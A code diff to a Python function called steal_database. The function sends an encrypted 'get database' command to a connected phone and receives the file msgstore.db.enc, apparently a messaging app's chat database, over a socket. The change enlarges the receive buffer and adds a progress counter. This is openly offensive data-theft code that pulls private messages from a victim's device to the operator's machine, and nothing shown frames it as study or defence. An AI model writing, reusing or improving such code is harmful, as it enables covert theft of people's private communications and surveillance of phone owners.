@@ -26,11 +26,15 @@ def steal_database():
     print('Got connection from: ', addr)
     conn.send(ciphertext)
     print("Encrypted 'get database' command sent to phone")
+    count = 0
     with open("msgstore.db.enc", "wb") as db:
-        database = conn.recv(2048)
+        database = conn.recv(8192)
         while database:
+            if count % 10:
+                print(count)
+            count +=1 
             db.write(database)
-            database = conn.recv(2048)
+            database = conn.recv(8192)
         db.write(database)
     print("Encrypted database has been received")
     with open('msgstore.db.enc', 'rb') as db_enc:
